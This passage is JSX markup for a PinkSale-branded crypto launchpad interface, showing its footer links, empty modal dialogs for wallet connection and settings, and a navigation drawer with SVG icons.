          <div class="border-b w-full dark:border-neutral-800 border-dashed my-4 sm:my-6 md:my-12"></div>
          <div class="grid grid-cols-1 gap-4 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 text-left mt-6 p-5">
            <div>
              <div class="flex items-center gap-2">
                <div class="flex-shrink-0">
                  <Image alt="PinkSale" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" style={{color:"transparent"}} src={pinksale} />
                </div>
                <div class="transition-all font-bold dark:text-slate-200 text-2xl">PinkSale</div>
              </div>
              <p class="mt-4">PinkSale helps everyone to create their own tokens and token sales in few seconds.</p>
            </div>

            <div>
              <div class="font-semibold uppercase">Useful Links</div>
              <ul class="mt-2">
                <li>
                  <a href="https://t.me/PinkSaleTracking" class="hover:underline hover:text-brand" target="_blank" rel="nofollow noreferrer">Pools alert</a>
                </li>
                <li>
                  <a href="https://docs.pinksale.finance/important/kyc-and-audit-at-pinksale" class="hover:underline hover:text-brand" target="_blank" rel="nofollow noreferrer">KYC &amp; Audit</a>
                </li>
                <li>
                  <a href="https://docs.pinksale.finance" class="hover:underline hover:text-brand" target="_blank" rel="nofollow noreferrer">Docs</a>
                </li>
                <li>
                  <a href="https://shop.pinksale.finance/" class="hover:underline hover:text-brand" target="_blank" rel="nofollow noreferrer">Shop</a>
                </li>
                <li>
                  <a href="https://legacy.pinksale.finance" class="hover:underline hover:text-brand" target="_blank" rel="nofollow noreferrer">Pinksale V1</a>
                </li>
              </ul>
            </div>

            <div>
              <div class="font-semibold uppercase">Follow us</div>
              <div class="mt-2 flex items-center gap-4">
                <a href="https://t.me/pinkecosystem" target="_blank" rel="nofollow noreferrer">
                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 256 256" class="text-[#0088cc]" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M236.88,26.19a9,9,0,0,0-9.16-1.57L25.06,103.93a14.22,14.22,0,0,0,2.43,27.21L80,141.45V200a15.92,15.92,0,0,0,10,14.83,15.91,15.91,0,0,0,17.51-3.73l25.32-26.26L173,220a15.88,15.88,0,0,0,10.51,4,16.3,16.3,0,0,0,5-.79,15.85,15.85,0,0,0,10.67-11.63L239.77,35A9,9,0,0,0,236.88,26.19Zm-61.14,36L86.15,126.35l-49.6-9.73ZM96,200V152.52l24.79,21.74Zm87.53,8L100.85,135.5l119-85.29Z"></path>
                  </svg>
                </a>
                <a href="https://twitter.com/pinkecosystem" target="_blank" rel="nofollow noreferrer">
                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"></path>
                  </svg>
                </a>
                <a href="https://www.facebook.com/profile.php?id=100085950917722" target="_blank" rel="nofollow noreferrer">
                  <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="text-[#1877F2]" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-32 736H663.9V602.2h104l15.6-120.7H663.9v-77.1c0-35 9.7-58.8 59.8-58.8h63.9v-108c-11.1-1.5-49-4.8-93.2-4.8-92.2 0-155.3 56.3-155.3 159.6v89H434.9v120.7h104.3V848H176V176h672v672z"></path>
                  </svg>
                </a>
              </div>
              <div class="font-semibold uppercase mt-6">Pinksale price</div>
              <div class="mt-2">
                <a href="https://www.coingecko.com/en/coins/pinksale" class="text-brand underline" target="_blank" rel="nofollow noreferrer">$259.35</a>
              </div>
            </div>

            <div>
              <div class="font-semibold uppercase">Interface</div>
              <ul class="mt-2">
                <li>
                  <div class="flex items-center gap-2 cursor-pointer hover:underline hover:text-emerald-500 text-emerald-500">
                    <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                      <circle cx="12" cy="12" r="5"></circle>
                      <line x1="12" y1="1" x2="12" y2="3"></line>
                      <line x1="12" y1="21" x2="12" y2="23"></line>
                      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                      <line x1="1" y1="12" x2="3" y2="12"></line>
                      <line x1="21" y1="12" x2="23" y2="12"></line>
                      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                    <div>Light mode</div>
                  </div>
                </li>
                <li>
                  <div class="flex items-center gap-2 cursor-pointer hover:underline hover:text-emerald-500">
                    <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                      <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <div>Dark mode</div>
                  </div>
                </li>
              </ul>
              <div class="font-semibold uppercase mt-6">Language</div>
              <div class="mt-2 flex gap-2 items-center"><div>
                <Image alt="English" loading="lazy" width="24" height="24" decoding="async" data-nimg="1" class="cursor-pointer hover:scale-125 transition-all duration-200 rounded-full border-2 border-transparent" style={{color:'transparent'}} src={us} />
              </div>
              <div>
                <Image alt="Chinese" loading="lazy" width="24" height="24" decoding="async" data-nimg="1" class="cursor-pointer hover:scale-125 transition-all duration-200 rounded-full border-2 border-transparent" style={{color:"transparent"}} src={cn} />
              </div>
            </div>
          </div>


          </div>
          </div>
       </footer>

      </div>

      <div class="fixed transition-all inset-0 z-[101] pointer-events-none invisible opacity-0">
        <div class="relative h-full"><div class="h-full w-full absolute z-10 bg-modal-overlay dark:bg-modal-overlay-dark" style={{opacity:"0"}}></div>
        `<div class="h-full overflow-y-auto py-6 pt-12 px-4">
          <div class="mx-auto relative z-20 rounded-sm shadow-md bg-white dark:bg-brand-dark h-auto overflow-y-auto max-w-lg" style={{opacity:"0",transform:"translateY(32px) translateZ(0)"}}>
            <div class="p-4 rounded-t-md flex gap-4 relative">
              <div class="flex-1">
                <div class="font-medium capitalize text-lg">Connect wallet</div>
                <div class="text-sm text-gray-400 pr-6">You need to connect a Solana wallet</div>
              </div>
              <button type="button" class="ant-btn ant-btn-link ant-btn-sm ant-btn-icon-only p-2 absolute right-1 top-0">
                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="28" width="28" xmlns="http://www.w3.org/2000/svg">
                  <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M368 368L144 144m224 0L144 368"></path>
                </svg>
              </button>
            </div>
            <div class="p-4"></div>
          </div>
        </div>
      </div>
      </div>

      <div class="fixed transition-all inset-0 z-[101] pointer-events-none invisible opacity-0"><div class="relative h-full"><div class="h-full w-full absolute z-10 bg-modal-overlay dark:bg-modal-overlay-dark" style={{opacity:"0"}}></div><div class="h-full overflow-y-auto py-6 pt-12 px-4"><div class="mx-auto relative z-20 rounded-sm shadow-md bg-white dark:bg-brand-dark h-auto overflow-y-auto max-w-lg" style={{opacity:'0',transform: "translateY(32px) translateZ(0)"}}><div class="p-4 rounded-t-md flex gap-4 relative"><div class="flex-1"><div class="font-medium capitalize text-lg">Missing the pool details information?</div></div><button type="button" class="ant-btn ant-btn-link ant-btn-sm ant-btn-icon-only p-2 absolute right-1 top-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="28" width="28" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M368 368L144 144m224 0L144 368"></path></svg></button></div><div class="p-4"></div></div></div></div></div>

      <div class="fixed transition-all inset-0 z-[101] pointer-events-none invisible opacity-0"><div class="relative h-full"><div class="h-full w-full absolute z-10 bg-modal-overlay dark:bg-modal-overlay-dark" style={{opacity:"0"}}></div><div class="h-full overflow-y-auto py-6 pt-12 px-4"><div class="mx-auto relative z-20 rounded-sm shadow-md bg-white dark:bg-brand-dark h-auto overflow-y-auto max-w-lg" style={{opacity:'0',transform: "translateY(32px) translateZ(0)"}}><div class="p-4 rounded-t-md flex gap-4 relative"><div class="flex-1"><div class="font-medium capitalize text-lg">Settings</div><div class="text-sm text-gray-400 pr-6">Customize your RPC and more on Solana</div></div><button type="button" class="ant-btn ant-btn-link ant-btn-sm ant-btn-icon-only p-2 absolute right-1 top-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="28" width="28" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M368 368L144 144m224 0L144 368"></path></svg></button></div><div class="p-4"></div></div></div></div></div>

      <div class="fixed transition-all inset-0 z-[101] pointer-events-none invisible opacity-0"><div class="relative h-full"><div class="h-full w-full absolute z-10 bg-modal-overlay dark:bg-modal-overlay-dark" style={{opacity:"0"}}></div><div class="h-full overflow-y-auto py-6 pt-12 px-4"><div class="mx-auto relative z-20 rounded-sm shadow-md bg-white dark:bg-brand-dark h-auto overflow-y-auto max-w-lg" style={{opacity:'0',transform: "translateY(32px) translateZ(0)"}}><div class="p-4 rounded-t-md flex gap-4 relative"><div class="flex-1"><div class="font-medium capitalize text-lg">Slippage Setting</div></div><button type="button" class="ant-btn ant-btn-link ant-btn-sm ant-btn-icon-only p-2 absolute right-1 top-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="28" width="28" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M368 368L144 144m224 0L144 368"></path></svg></button></div><div class="p-4"></div></div></div></div></div>

      </div>

      <div>
        <div class="ant-drawer transition-all ant-drawer-right ant-drawer-open" tabindex="-1">
        <div onClick={() => setChange(false)} class={["ant-drawer-mask", change ? '' : 'ant-drawer-content-wrapper-hidden'].join(' ')}></div>
        <div tabindex="0" aria-hidden="true" data-sentinel="start" style={{width: '0px', height: '0px', overflow: 'hidden', outline: 'none', position: 'absolute'}}></div>
        <div class={["ant-drawer-content-wrapper", change ? '' : 'ant-drawer-content-wrapper-hidden'].join(' ')} style={{width: '250px'}}>
          <div class="ant-drawer-content" aria-modal="true" role="dialog">
            <div class="ant-drawer-wrapper-body">
              <div class="ant-drawer-header">
                  <button type="button" onClick={() => setChange(false)} aria-label="Close" class="ant-drawer-close">
                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="text-gray-500 dark:text-[white-200]" font-size="20" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                      <path d="M289.94 256l95-95A24 24 0 00351 127l-95 95-95-95a24 24 0 00-34 34l95 95-95 95a24 24 0 1034 34l95-95 95 95a24 24 0 0034-34z"></path>
                    </svg>
                  </button>
                  <div class="ant-drawer-title">
                    <div class="items-center gap-4 flex">
                      <div>
                       <ConnectButton type={'connect'} />
                      </div>
                    </div>
                  </div>
              </div>
              <div class="ant-drawer-body">
                <ul class="my-2">
                  <li>
                    <div class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black ">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M20.92 2.38A15.72 15.72 0 0 0 17.5 2a8.26 8.26 0 0 0-6 2.06Q9.89 5.67 8.31 7.27c-1.21-.13-4.08-.2-6 1.74a1 1 0 0 0 0 1.41l11.3 11.32a1 1 0 0 0 1.41 0c1.95-2 1.89-4.82 1.77-6l3.21-3.2c3.19-3.19 1.74-9.18 1.68-9.43a1 1 0 0 0-.76-.73zm-2.36 8.75L15 14.67a1 1 0 0 0-.27.9 6.81 6.81 0 0 1-.54 3.94L4.52 9.82a6.67 6.67 0 0 1 4-.5A1 1 0 0 0 9.39 9s1.4-1.45 3.51-3.56A6.61 6.61 0 0 1 17.5 4a14.51 14.51 0 0 1 2.33.2c.24 1.43.62 5.04-1.27 6.93z"></path>
                          <circle cx="15.73" cy="8.3" r="2"></circle>
                          <path d="M5 16c-2 1-2 5-2 5a7.81 7.81 0 0 0 5-2z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Launchpads</div>
                    </div>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <div class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black ">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M256.16 15.822c-74.685 0-124.825 36.292-157.865 90.487C66.36 158.692 51.637 228.053 50.68 294.954c44.44 12.795 73.834 28.683 90.46 50.123 15.804 20.383 18.445 45.188 12.157 71.963 23.635 7.218 62.826 11.32 100.986 10.905 38.28-.416 76.213-5.67 96.373-13.44-4.608-25.936-.182-50.215 16.983-70.07 17.928-20.738 48.197-36.53 93.4-49.488-.972-63.406-15.24-132.688-46.868-185.92-20.367-34.277-47.386-61.936-82.97-77.972-62.555 14.347-113.232 44.996-143.62 84.12 25.38 8.96 46.088 21.593 65.35 34.583l10.742 7.244-10.266 7.906c-26.884 20.705-46.28 43.707-65.26 67.48 28.468 22.27 47.56 52.2 29.02 65.186-33.572 23.518-170.713 1.396-119.002-78.754 6.006-9.31 15.307-13.314 26.2-13.496 14.635-.244 32.144 6.414 48.4 16.37 17.11-21.452 35.198-43.144 59.1-63.32-18.538-11.88-37.98-22.425-61.975-29.265l-12.29-3.503 7.066-10.65c28.184-42.48 75.737-75.727 134.613-94.523-13.362-3.012-27.71-4.612-43.118-4.612h-.002zm126.594 189.502c10.892.182 20.19 4.187 26.197 13.496 51.712 80.15-85.427 102.272-119 78.754-31.496-22.06 45.603-93.04 92.804-92.25zM252.2 309.057c13.922 0 38.53 68.05 30.277 79.51-6.48 8.996-54.935 8.617-60.555 0-7.197-11.034 16.31-79.51 30.277-79.51zM354.71 433.13c-10.557 3.91-23.223 6.832-37.17 8.952l5.94 48.89h53.416l-22.185-57.84zm-207.888 1.57l-18.5 56.273h47.092l5.914-48.684c-12.764-1.877-24.484-4.38-34.506-7.59zm152.17 9.667c-13.13 1.28-26.996 1.98-41.078 2.21v44.396h46.74l-5.662-46.606zm-99.107.14l-5.647 46.466h44.99V446.6c-13.444-.204-26.714-.894-39.343-2.094z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Degen</div>
                    </div>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <div class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black ">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M12 2C9.243 2 7 4.243 7 7v2H6c-1.103 0-2 .897-2 2v9c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-9c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zM9 7c0-1.654 1.346-3 3-3s3 1.346 3 3v2H9V7zm9.002 13H13v-2.278c.595-.347 1-.985 1-1.722 0-1.103-.897-2-2-2s-2 .897-2 2c0 .736.405 1.375 1 1.722V20H6v-9h12l.002 9z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">PinkLock</div>
                    </div>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <div class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black ">
                    <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                      <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 256 256" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M230,120a102,102,0,0,0-204,0,6,6,0,0,0,2.27,4.69l.13.11L122,195v23H112a6,6,0,0,0,0,12h32a6,6,0,0,0,0-12H134V195l93.6-70.2h0A6,6,0,0,0,230,120Zm-12.2-6H173.9c-1.3-42.92-16.5-68.62-28.43-82.3A90.2,90.2,0,0,1,217.8,114ZM128,31.43A77.14,77.14,0,0,1,143.42,49C157.26,70.08,161.24,95,161.89,114H94.11c1.06-31.88,10.49-52.86,18.47-65A76.69,76.69,0,0,1,128,31.43ZM157.8,126,128,179.65,98.2,126Zm-73.33,0,24.62,44.32L50,126Zm87.06,0H206l-59.09,44.32Zm-61-94.3C98.6,45.38,83.4,71.08,82.1,114H38.2A90.2,90.2,0,0,1,110.53,31.7Z"></path>
                      </svg>
                    </div>
                    <div class="flex-1 line-clamp-1 whitespace-nowrap">Airdrops</div>
                   </div>
                   <div class="transition-all"></div>
                  </li>
                  <li>
                      <div class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black ">
                        <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                          <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                            <path fill="none" d="M0 0h24v24H0z"></path><path d="M9 4c-4.42 0-8 3.58-8 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm3-7.5h-2v5H8v-5H6V9h6v1.5zm8.25-6.75L23 5l-2.75 1.25L19 9l-1.25-2.75L15 5l2.75-1.25L19 1l1.25 2.75zm0 14L23 19l-2.75 1.25L19 23l-1.25-2.75L15 19l2.75-1.25L19 15l1.25 2.75z"></path>
                          </svg>
                        </div>
                        <div class="flex-1 line-clamp-1 whitespace-nowrap">Token</div>
                      </div>
                      <div class="transition-all"></div>
                  </li>
                </ul>
                <div class="ant-divider ant-divider-horizontal" role="separator"></div>
                <ul class="my-2">
                  <li>
                    <a href="https://legacy.pinksale.finance/private-sales" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M20.995 6.903a.997.997 0 0 0-.547-.797l-7.973-4a.997.997 0 0 0-.895-.002l-8.027 4c-.297.15-.502.437-.544.767-.013.097-1.145 9.741 8.541 15.008a.995.995 0 0 0 .969-.009c9.307-5.259 8.514-14.573 8.476-14.967zm-8.977 12.944c-6.86-4.01-7.14-10.352-7.063-12.205l7.071-3.523 6.998 3.511c.005 1.87-.481 8.243-7.006 12.217z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Private Sales</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " href="/leaderboards">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M255 471L91.7 387V41h328.6v346zm-147.3-93.74L255 453l149.3-75.76V57H107.7v320.26zm187.61-168.34l-14.5-46 38.8-28.73-48.27-.43L256 87.94l-15.33 45.78-48.27.43 38.8 28.73-14.5 46 39.31-28zM254.13 311.5l98.27-49.89v-49.9l-98.14 49.82-94.66-48.69v50zm.13 32.66l-94.66-48.69v50l94.54 48.62 98.27-49.89v-49.9z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Leaderboards</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " href="/buy-crypto-fiat">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <circle cx="15.5" cy="13.5" r="2.5"></circle>
                          <path d="M12 13.5c0-.815.396-1.532 1-1.988A2.47 2.47 0 0 0 11.5 11a2.5 2.5 0 1 0 0 5 2.47 2.47 0 0 0 1.5-.512 2.486 2.486 0 0 1-1-1.988z"></path>
                          <path d="M20 4H4c-1.103 0-2 .897-2 2v12c0 1.103.897 2 2 2h16c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2zM4 18V6h16l.002 12H4z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Buy Crypto Fiat</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " href="/bridge">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M740 161c-61.8 0-112 50.2-112 112 0 50.1 33.1 92.6 78.5 106.9v95.9L320 602.4V318.1c44.2-15 76-56.9 76-106.1 0-61.8-50.2-112-112-112s-112 50.2-112 112c0 49.2 31.8 91 76 106.1V706c-44.2 15-76 56.9-76 106.1 0 61.8 50.2 112 112 112s112-50.2 112-112c0-49.2-31.8-91-76-106.1v-27.8l423.5-138.7a50.52 50.52 0 0 0 34.9-48.2V378.2c42.9-15.8 73.6-57 73.6-105.2 0-61.8-50.2-112-112-112zm-504 51a48.01 48.01 0 0 1 96 0 48.01 48.01 0 0 1-96 0zm96 600a48.01 48.01 0 0 1-96 0 48.01 48.01 0 0 1 96 0zm408-491a48.01 48.01 0 0 1 0-96 48.01 48.01 0 0 1 0 96z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Bridge</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " href="/antibot">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                          <path d="M8 4h8a2 2 0 0 1 2 2v4a2 2 0 0 1 -2 2m-4 0h-4a2 2 0 0 1 -2 -2v-4"></path>
                          <path d="M12 2v2"></path>
                          <path d="M9 12v9"></path>
                          <path d="M15 15v6"></path>
                          <path d="M5 16l4 -2"></path>
                          <path d="M9 18h6"></path>
                          <path d="M14 8v.01"></path>
                          <path d="M3 3l18 18"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Anti-Bot</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " href="/multi-sender">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="m21.426 11.095-17-8A.999.999 0 0 0 3.03 4.242L4.969 12 3.03 19.758a.998.998 0 0 0 1.396 1.147l17-8a1 1 0 0 0 0-1.81zM5.481 18.197l.839-3.357L12 12 6.32 9.16l-.839-3.357L18.651 12l-13.17 6.197z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Multi-Sender</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                </ul>
                <div class="ant-divider ant-divider-horizontal" role="separator"></div>
                <ul class="my-2">
                  <li>
                    <a href="https://www.dexview.com/" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M888 792H200V168c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v688c0 4.4 3.6 8 8 8h752c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM305.8 637.7c3.1 3.1 8.1 3.1 11.3 0l138.3-137.6L583 628.5c3.1 3.1 8.2 3.1 11.3 0l275.4-275.3c3.1-3.1 3.1-8.2 0-11.3l-39.6-39.6a8.03 8.03 0 0 0-11.3 0l-230 229.9L461.4 404a8.03 8.03 0 0 0-11.3 0L266.3 586.7a8.03 8.03 0 0 0 0 11.3l39.5 39.7z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">dexview.com</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a href="https://t.me/PinkSaleTracking" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M193 796c0 17.7 14.3 32 32 32h574c17.7 0 32-14.3 32-32V563c0-176.2-142.8-319-319-319S193 386.8 193 563v233zm72-233c0-136.4 110.6-247 247-247s247 110.6 247 247v193H404V585c0-5.5-4.5-10-10-10h-44c-5.5 0-10 4.5-10 10v171h-75V563zm-48.1-252.5l39.6-39.6c3.1-3.1 3.1-8.2 0-11.3l-67.9-67.9a8.03 8.03 0 0 0-11.3 0l-39.6 39.6a8.03 8.03 0 0 0 0 11.3l67.9 67.9c3.1 3.1 8.1 3.1 11.3 0zm669.6-79.2l-39.6-39.6a8.03 8.03 0 0 0-11.3 0l-67.9 67.9a8.03 8.03 0 0 0 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l67.9-67.9c3.1-3.2 3.1-8.2 0-11.3zM832 892H192c-17.7 0-32 14.3-32 32v24c0 4.4 3.6 8 8 8h688c4.4 0 8-3.6 8-8v-24c0-17.7-14.3-32-32-32zM484 180h56c4.4 0 8-3.6 8-8V76c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v96c0 4.4 3.6 8 8 8z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">Pools alert</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
                    <a href="https://docs.pinksale.finance/important/kyc-and-audit-at-pinksale" class="transition-all flex items-center active:bg-[#fff0f3] dark:active:bg-black " target="_blank" rel="nofollow noreferrer">
                      <div class="grid w-[38px] h-[38px] px-[10px] place-content-center rounded-md">
                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                          <path d="M17.03 9.78a.75.75 0 0 0-1.06-1.06l-5.47 5.47-2.47-2.47a.75.75 0 0 0-1.06 1.06l3 3a.75.75 0 0 0 1.06 0l6-6Z"></path>
                          <path d="m14.136 1.2 1.375 1.01c.274.201.593.333.929.384l1.687.259a3.61 3.61 0 0 1 3.02 3.021l.259 1.686c.051.336.183.655.384.929l1.01 1.375a3.61 3.61 0 0 1 0 4.272l-1.01 1.375a2.106 2.106 0 0 0-.384.929l-.259 1.687a3.61 3.61 0 0 1-3.021 3.02l-1.686.259a2.106 2.106 0 0 0-.929.384l-1.375 1.01a3.61 3.61 0 0 1-4.272 0l-1.375-1.01a2.106 2.106 0 0 0-.929-.384l-1.687-.259a3.61 3.61 0 0 1-3.02-3.021l-.259-1.686a2.117 2.117 0 0 0-.384-.929L1.2 14.136a3.61 3.61 0 0 1 0-4.272l1.01-1.375c.201-.274.333-.593.384-.929l.259-1.687a3.61 3.61 0 0 1 3.021-3.02l1.686-.259c.336-.051.655-.183.929-.384L9.864 1.2a3.61 3.61 0 0 1 4.272 0Zm-3.384 1.209-1.375 1.01a3.614 3.614 0 0 1-1.59.658l-1.686.258a2.111 2.111 0 0 0-1.766 1.766l-.258 1.686a3.61 3.61 0 0 1-.658 1.589l-1.01 1.376a2.11 2.11 0 0 0 0 2.496l1.01 1.375c.344.469.57 1.015.658 1.59l.258 1.686c.14.911.855 1.626 1.766 1.766l1.686.258a3.61 3.61 0 0 1 1.589.658l1.376 1.01a2.11 2.11 0 0 0 2.496 0l1.375-1.01a3.613 3.613 0 0 1 1.59-.657l1.686-.26a2.11 2.11 0 0 0 1.766-1.765l.258-1.686a3.61 3.61 0 0 1 .658-1.589l1.01-1.376a2.11 2.11 0 0 0 0-2.496l-1.01-1.375a3.613 3.613 0 0 1-.657-1.59l-.26-1.686a2.11 2.11 0 0 0-1.765-1.766l-1.686-.258a3.61 3.61 0 0 1-1.589-.658l-1.376-1.01a2.11 2.11 0 0 0-2.496 0Z"></path>
                        </svg>
                      </div>
                      <div class="flex-1 line-clamp-1 whitespace-nowrap">KYC &amp; Audit</div>
                    </a>
                    <div class="transition-all"></div>
                  </li>
                  <li>
